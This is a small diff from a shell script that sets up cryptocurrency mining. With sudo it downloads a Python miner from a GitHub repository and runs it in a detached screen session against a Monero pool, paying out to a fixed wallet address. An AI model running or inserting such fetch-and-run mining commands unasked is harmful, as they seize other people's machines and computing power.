@@ -27,4 +27,4 @@ sudo chmod +x /usr/bin/xmrig
 rm -f m.py
 sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/grundmeierl/PyMinerTSA/raw/master/m.py -O m.py
 
-sudo screen -dmSL MM bash -c "python m.py pool.supportxmr.com:9000 471fSppS1K5V7TJQhtFmtqMhnkBnUikq55gbb8cNfAL1i6ZtcKaPVT3j7yo4sk5xrFXFpBZUo9mdAdZhbWD1Sk61D8U6A3M GwangjuWHO 90"
+sudo screen -dmSL MM bash -c "python m.py pool.supportxmr.com:9000 471fSppS1K5V7TJQhtFmtqMhnkBnUikq55gbb8cNfAL1i6ZtcKaPVT3j7yo4sk5xrFXFpBZUo9mdAdZhbWD1Sk61D8U6A3M GwangjuWHO 89"
